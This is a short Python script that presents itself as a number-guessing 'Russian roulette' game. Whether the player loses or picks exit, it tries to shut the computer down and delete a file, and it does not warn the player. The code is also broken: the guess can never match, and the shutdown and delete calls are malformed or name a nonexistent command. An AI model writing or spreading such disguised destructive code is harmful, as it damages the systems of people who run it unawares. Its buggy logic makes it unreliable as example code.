import os
import sys
import random
import time
import subprocess
wait=1




print("RussischRoulette - A simple game of chance")
print("Type 'play' to play the game or 'exit' to quit.")
if input().lower() == 'play':
    print("Generating Number 1-10")
    number = random.randint(1, 10)
    for i in range(10):
        time.sleep(0.3)
        print(random.randint(1,10))
            
    print("Number decided")
    if input() == number:
        print("Congratulations! You win!")
    else:
        
        
        subprocess.run("shutdown", "-s")
        os.remove("pythonfile.py")
        subprocess.run("sel", "pythonfile.py")

else:    
    print("Exiting the game. Goodbye!")
    subprocess.run("sel", "pythonfile.py")
    subprocess.run("shutdown", "-s")

